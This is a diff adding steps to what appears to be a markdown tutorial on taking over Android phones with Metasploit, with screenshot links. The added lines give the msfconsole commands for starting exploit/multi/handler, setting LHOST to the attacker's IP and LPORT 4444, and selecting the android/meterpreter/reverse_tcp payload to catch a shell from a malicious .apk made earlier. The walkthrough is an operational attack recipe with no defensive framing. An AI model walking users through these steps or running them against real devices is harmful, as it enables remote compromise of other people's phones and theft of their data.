@@ -12,4 +12,19 @@ you can find your ip address by executing `ifconfig`:
 
 then enter measploit by executing `msfconsole`.
 
-![msfconsole]
+
+![Msfconsole](https://cdn1.imggmi.com/uploads/2019/10/28/f65c76f156b3e0c9281ee8ce31fe5404-full.png)
+
+then `use exploit/multi/handler` will change our dir to exploit(multi/handler):
+
+![use exploit....](https://cdn1.imggmi.com/uploads/2019/10/28/7cd5f242675af9b4489ceb007e522516-full.png)
+
+after that you have to set your LHOST and LPORT those are specified when we were trying to make an .apk payload.
+
+LHOST is your ip address and LPORT is 4444.you can make it by `set LHOST <your IP>` and `set LPORT 4444`
+
+![SET](https://cdn1.imggmi.com/uploads/2019/10/28/ad786a92f00b1d511a3da1a99fd0a63c-full.png)
+
+then we have to set our payload by `set payload android/meterpreter/reverse_tcp`
+
+![set payload](https://cdn1.imggmi.com/uploads/2019/10/28/05a5525e2835ad7416f1d6265655b70c-full.png)
